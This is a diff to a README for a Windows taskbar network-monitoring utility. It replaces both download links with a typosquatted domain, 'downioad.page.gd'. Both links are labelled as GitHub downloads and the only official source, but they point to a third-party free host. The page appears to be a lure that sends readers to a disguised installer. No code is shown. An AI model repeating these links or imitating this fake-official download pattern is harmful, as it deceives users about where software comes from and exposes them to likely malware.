@@ -2,7 +2,7 @@
 
 TrafficMonitor Advanced Desktop Suite is a powerful Windows application designed to provide real-time network speed monitoring and comprehensive traffic statistics directly from your taskbar. This tool enhances your desktop experience with customizable widgets and detailed analytics, making it an essential utility for Windows 10 and 11 users in 2026 and beyond.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -55,7 +55,7 @@ A: Absolutely! TrafficMonitor offers a range of customization options in its set
 
 For the latest version of TrafficMonitor Advanced Desktop Suite, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Note: This download link is the only official source for obtaining TrafficMonitor. Always download from trusted sources to ensure security and reliability.*
 
